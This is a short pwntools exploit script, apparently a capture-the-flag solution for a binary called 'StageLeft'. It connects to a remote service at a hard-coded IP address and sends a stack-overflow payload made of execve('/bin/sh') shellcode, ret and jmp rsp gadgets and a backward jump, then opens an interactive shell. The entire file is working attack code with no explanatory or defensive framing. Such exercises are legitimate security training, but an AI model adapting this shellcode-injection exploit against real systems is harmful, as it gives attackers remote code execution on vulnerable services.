#!/usr/bin/python3
from pwn import *

e = ELF('./StageLeft')

context.binary = e

#p = process(e.path)
p = remote('3.91.151.73', 9001)

rop = ROP(e)

#gdb.attach(p)

s = flat({
    0x0: asm(shellcraft.execve('/bin/sh')), 
    0x28: [p64(rop.ret.address), p64(rop.jmp_rsp.address)]}, 
    asm('jmp $-0x38'))
print(hex(len(s)))

#gdb.attach(p)

p.sendlineafter(b'Cramped...', s)

#pray for flag

p.interactive()
